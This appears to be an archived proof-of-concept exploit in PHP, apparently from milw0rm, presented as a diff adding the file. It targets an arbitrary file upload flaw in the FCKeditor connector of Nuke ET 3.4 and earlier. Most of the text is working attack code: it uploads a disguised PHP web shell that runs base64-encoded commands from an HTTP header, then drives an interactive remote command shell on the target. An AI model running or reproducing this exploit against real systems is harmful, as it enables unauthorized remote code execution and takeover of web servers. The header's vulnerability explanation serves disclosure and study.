@@ -1,0 +1,132 @@
+<?php
+
+/*
+	---------------------------------------------------------------
+	Nuke ET <= 3.4 (fckeditor) Remote Arbitrary File Upload Exploit
+	---------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.truzone.org/
+	
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+	
+	[-] vulnerable code in /nuke/FCKeditor/editor/filemanager/browser/default/connectors/php/commands.php
+	
+	147.	function FileUpload( $resourceType, $currentFolder )
+	148.	{
+	149.		$sErrorNumber = '0' ;
+	150.		$sFileName = '' ;
+	151.	
+	152.		if ( isset( $_FILES['NewFile'] ) && !is_null( $_FILES['NewFile']['tmp_name'] ) )
+	153.		{
+	154.			$oFile = $_FILES['NewFile'] ;
+	155.	
+	156.			// Map the virtual path to the local server path.
+	157.			$sServerDir = ServerMapFolder( $resourceType, $currentFolder ) ;
+	158.	
+	159.			// Get the uploaded file name.
+	160.			$sFileName = $oFile['name'] ;
+	161.			$sOriginalFileName = $sFileName ;
+	162.			// Security fix by truzone 01-15-2006
+	163.			//$sExtension = substr( $sFileName, ( strrpos($sFileName, '.') + 1 ) ) ;
+	164.			//$sExtension = strtolower( $sExtension ) ;
+	165.	
+	166.			if(extension_loaded("mime_magic")){
+	167.			$sExtension = mime_content_type($oFile['tmp_name']);
+	168.			}else{
+	169.			$sExtension = $oFile['type'];
+	170.			}
+	171.			// en of security fix by truzone 01-15-2006
+	172.			global $Config ;
+	173.	
+	174.			$arAllowed	= $Config['AllowedExtensions'][$resourceType] ;
+	175.			$arDenied	= $Config['DeniedExtensions'][$resourceType] ;
+
+	An attacker might be able to upload arbitrary files containing malicious PHP code due to the code
+	near lines 166-170 will check only the MIME type of the upload request, that can be easily spoofed!
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+define(STDIN, fopen("php://stdin", "r"));
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...";
+		$sock = fsockopen($host, 80);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1024);
+	fclose($sock);
+	return $resp;
+}
+
+function connector_response($html)
+{
+	return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
+}
+
+print "\n+------------------------------------------------------------------+";
+print "\n| Nuke ET <= 3.4 (fckeditor) Arbitrary File Upload Exploit by EgiX |";
+print "\n+------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......: php $argv[0] host path";
+	print "\nExample....: php $argv[0] localhost /";
+	print "\nExample....: php $argv[0] localhost /nukeet/\n";
+	die();
+}
+
+$host = $argv[1];
+$path = ereg_replace("(/){2,}", "/", $argv[2]);
+
+$filename  = md5(time()).".php";
+$connector = "FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php";
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
+$payload .= "Content-Type: application/zip\r\n\r\n";
+$payload .= "PK\003\004<?php error_reporting(0);print(\"_code_\\n\");passthru(base64_decode(\$_SERVER[HTTP_CMD])); ?>\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet	 = "POST {$path}{$connector}?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0\r\n";
+$packet	.= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $payload;
+
+if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
+else print "\n[-] Shell uploaded to {$filename}...starting it!\n";
+
+$path .= str_repeat("../", substr_count($path, "/") - 1) . "UserFiles/File/"; // come back to the document root 
+
+$packet  = "GET {$path}{$filename} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+	print "\nnukeet-shell# ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+		preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed...\n");
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2008-10-18]
